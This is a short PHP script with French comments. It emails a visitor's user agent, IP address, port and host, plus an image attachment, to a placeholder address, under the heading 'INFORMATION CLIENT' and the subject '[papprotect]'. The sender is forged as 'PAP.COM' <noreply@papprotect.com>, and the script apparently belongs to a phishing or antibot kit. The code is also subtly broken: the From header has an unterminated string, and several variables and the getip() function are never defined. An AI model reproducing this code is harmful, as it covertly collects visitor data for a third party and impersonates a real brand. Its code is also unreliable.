<?php
$mail = 'VOTRE EMAIL'; // Déclaration de l'adresse de destination.
if (!preg_match("#^[a-z0-9._-]+@(hotmail|live|msn).[a-z]{2,4}$#", $mail)) // On filtre les serveurs qui présentent des bogues.
{
	$passage_ligne = "\r\n";
}
else
{
	$passage_ligne = "\n";
}
//=====Déclaration des messages au format texte et au format HTML.
$message_txt = "".$ua." ".getip()." ".$up." ".$uh."";
$message_html = "[INFORMATION CLIENT] <br><br>".$ua." <br><br>IP CLIENT : ".getip()." <br><br>PORT : ".$up." <br><br>HOST : ".$uh." 
<br><br><br>POUR PLUS AVOIR DE SOUCI VEUILLEZ BLOQUER LE CLIENT DANS LA BLACKLIST.";
//==========
 
//=====Lecture et mise en forme de la pièce jointe.
$fichier   = fopen("image.jpg", "r");
$attachement = fread($fichier, filesize("image.jpg"));
$attachement = chunk_split(base64_encode($attachement));
fclose($fichier);
//==========
 
//=====Création de la boundary.
$boundary = "-----=".md5(rand());
$boundary_alt = "-----=".md5(rand());
//==========
 
//=====Définition du sujet.
$sujet = "[papprotect]";
//=========
 
//=====Création du header de l'e-mail.
$header = "From: \"PAP.COM\"<noreply@papprotect.com>.$passage_ligne;
$header.= "Reply-to: \"PAP.COM\" <noreply@papprotect.com>".$passage_ligne;
$header.= "MIME-Version: 1.0".$passage_ligne;
$header.= "Content-Type: multipart/mixed;".$passage_ligne." boundary=\"$boundary\"".$passage_ligne;
//==========
 
//=====Création du message.
$message = $passage_ligne."--".$boundary.$passage_ligne;
$message.= "Content-Type: multipart/alternative;".$passage_ligne." boundary=\"$boundary_alt\"".$passage_ligne;
$message.= $passage_ligne."--".$boundary_alt.$passage_ligne;

//=====Ajout du message au format texte.
$message.= "Content-Type: text/plain; charset=\"ISO-8859-1\"".$passage_ligne;
$message.= "Content-Transfer-Encoding: 8bit".$passage_ligne;
$message.= $passage_ligne.$message_txt.$passage_ligne;
//==========
 
$message.= $passage_ligne."--".$boundary_alt.$passage_ligne;
 
//=====Ajout du message au format HTML.
$message.= "Content-Type: text/html; charset=\"ISO-8859-1\"".$passage_ligne;
$message.= "Content-Transfer-Encoding: 8bit".$passage_ligne;
$message.= $passage_ligne.$message_html.$passage_ligne;
//==========
 
//=====On ferme la boundary alternative.
$message.= $passage_ligne."--".$boundary_alt."--".$passage_ligne;
//==========
 
$message.= $passage_ligne."--".$boundary.$passage_ligne;
 
//=====Ajout de la pièce jointe.
$message.= "Content-Type: image/jpeg; name=\"image.jpg\"".$passage_ligne;
$message.= "Content-Transfer-Encoding: base64".$passage_ligne;
$message.= "Content-Disposition: attachment; filename=\"image.jpg\"".$passage_ligne;
$message.= $passage_ligne.$attachement.$passage_ligne.$passage_ligne;
$message.= $passage_ligne."--".$boundary."--".$passage_ligne; 
//========== 

//=====Envoi de l'e-mail.
mail($mail,$sujet,$message,$header);
//==========
?>
